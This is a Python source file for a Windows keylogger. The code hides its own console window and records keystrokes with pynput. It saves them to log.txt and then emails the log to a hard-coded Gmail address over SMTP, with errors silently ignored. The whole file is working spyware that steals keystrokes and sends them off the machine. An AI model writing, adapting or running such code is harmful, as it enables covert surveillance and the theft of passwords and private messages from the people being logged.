import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui

c_window = win32console.GetConsoleWindow()
win32gui.ShowWindow(c_window, 0)
word_keys = []
log_file = open('log.txt', 'w+')

def send_data():
    msg = MIMEMultipart()
    email = "programming.fadn@gmail.com"
    password = "passwordhere"
    msg["From"] = email
    msg["To"] = email
    msg["Subject"] = "Keylogger test"
    msg.attach(MIMEText(file("log.txt").read()))

    try:
        server = smtplib.SMTP("smtp.gmail.com:587")
        server.starttls()
        server.login(email, password)
        server.sendmail(msg["From"], msg["To"], msg.as_string())
        server.quit()
    except:
        pass

def print_word():
    word = ''.join(word_keys)
    log_file.write(word)
    log_file.write('\n')
    log_file.close()
    time.sleep(3)
    send_data()

def press(key):
    conv_key = convert(key)
    
    if conv_key == "Key.esc":
        print("exit")
        print_word()
        return False
    elif conv_key == "Key.space":
        word_keys.append(" ")
    elif conv_key == "Key.enter":
        word_keys.append("\n")
    elif conv_key == "Key.shift":
        pass
    elif conv_key == "Key.backspace":
        pass
    elif conv_key == "Key.tab":
        pass
    else:
        word_keys.append(conv_key)


def convert(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)


with pynput.keyboard.Listener(on_press=press) as listen:
    listen.join()